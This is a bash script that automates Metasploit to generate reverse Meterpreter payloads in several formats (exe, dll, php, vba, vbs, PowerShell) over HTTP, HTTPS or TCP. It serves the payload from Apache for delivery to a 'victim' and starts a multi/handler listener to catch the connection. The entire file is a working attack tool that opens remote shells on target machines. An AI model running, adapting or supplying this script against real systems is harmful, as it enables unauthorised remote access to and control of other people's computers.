#!/bin/bash
#Script to generate reverse payload and launch multihandler from metasploit
#tested and working in Kali linux
#Usage ./script port
#by n0b1dy

RED="\e[0;31m"
GREEN="\e[0;32m"
YELLOW="\e[0;33m"
BLUE="\e[0;34m"
PURPLE="\e[0;35m"
HPURPLE="\e[1;35m"
IRED="\e[0;91m"
IGREEN="\e[0;92m"
IYELLOW="\e[0;93m"
IBLUE="\e[0;94m"
GREEN="\e[1;32m"
BRED="\e[1;31m"
BLUE="\e[1;34m"
BGREEN="\e[1;32m"
BOLD="\e[1m"
RESET="\e[0m"


msg()     { echo -e "${BOLD}[*]${RESET} ${@}"; }
msgline() { echo -e "${BOLD}[*] `perl -e 'print "-"x50'`${RESET}"; }
msgbox()  { msgline; echo -e "${BOLD}[*]${RESET} ${@}"; msgline; }

usage() { echo -e "${BOLD}${BBLUE}\t[*] ${@}${RESET}"; }

success() { echo -e "${BOLD}${BGREEN}[SUCCESS]${RESET} ${@}"; }
error()   { echo -e "${BOLD}${BRED}[ERROR]${RESET} ${@}"; }
info()     { echo -e "${BOLD}${BLUE}[INFO]${RESET} ${@}"; }

MSFPAY=`which msfpayload`
MSFCLI=`which msfcli`
MSFVENOM=`which msfvenom`
MSFENC=`which msfencode`

attacker="" # interface ip

port=$1
type=$2
filename=$3
interface=$4
stage=$5



# gets interface ip

getip()
{
#calculates target ip by default interface
attacker=`ifconfig $1 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
}

if [ $# -ne 5 ]; then
usage "Script to generate reverse metasploit payloads and launch listener."
usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA|V(B)s|p(S)h> <filename> <eth1|tap0> <(H)ttp|Http(S)|(T)cp>"
exit
fi





generate_payload ()
{
start=`date` #start counting time
msgline;
getip $interface;#get listenting ip interface
extension=""
format=""

info "[${BOLD}${GREEN}$attacker${RESET}.${BOLD}${YELLOW}$port${RESET}]--|--[${BOLD}${YELLOW}$filename.$extension${BOLD}${RED}victim${RESET}]"
info "Reverse Payload Generator.[$start]"
#saves current directory
dir=`echo $PWD`


case $type in
 
 'X')
 type_payload="windows"
 extension="exe"
 arch="x86"
 #format="X"
 format="exe"
 ;;
 
 'D')
 type_payload="windows"
 extension="dll"  
  arch="x86"
 # format="D"
 format="dll"
 ;;
 
 'P')
 type_payload="php" # this works in msfpayload 
 extension="php.txt"
  arch="x86"
 # format="R"
 ;;
 
 'V')
 type_payload="windows"
  arch="x86"
 extension="vba"
 #format="V"
 format="vbs"
 ;;
 
 'B')
 type_payload="windows"
 arch="x86"
 extension="vbs"
 format="vbs"
 ;;
 
 'S')
 type_payload="windows"
 arch="x86"
 extension="ps1"
 format="psh"
 #format="psh" # psh x64 does not work for msfvenom
 ;;
 
 
esac 


case $stage in
 
 'H')
 success "Reverse HTTP Payload Selected"
 stage="reverse_http"
 ;;
 
 'S')
 success "Reverse HTTPS Payload Selected"
 stage="reverse_https"
 ;;
 
 'T')
 success "Reverse TCP Payload Selected"
 stage="reverse_tcp"
 ;;
 
esac 


  info "Wait till we are Generating the [${BOLD}${YELLOW}$filename.$extension${RESET}]"
  #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
 # $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension
  case $type in
  
  'S' | 'P')
  success "MSFPAYLOAD"
   $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port EXITFUNC=thread R | $MSFENC -t $format -a $arch> $dir/$filename.$extension
  ;;
  
  'X' | 'D' | 'V' | 'B')
  success "MSFVENOM"
  $MSFVENOM -p $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port -f $format -a $arch > $dir/$filename.$extension
  ;;
  
  esac
  
  info "Transfer the [${BOLD}${YELLOW}$filename.$extension${RESET}] to /var/www for delivery and starting webserver"
  mv $filename.$extension /var/www
  /etc/init.d/apache2 start
  success "Apache server started"
  info "Execute the [${BOLD}${YELLOW}$filename.$extension${RESET}] to the victim"
  info "Launching multihandler"
  $MSFCLI multi/handler PAYLOAD=$type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port E
  success "Apache server stopped"
  /etc/init.d/apache2 stop
  end=`date`
 clear
success "Reverse Phun Generator.[$end]"

}

generate_payload;



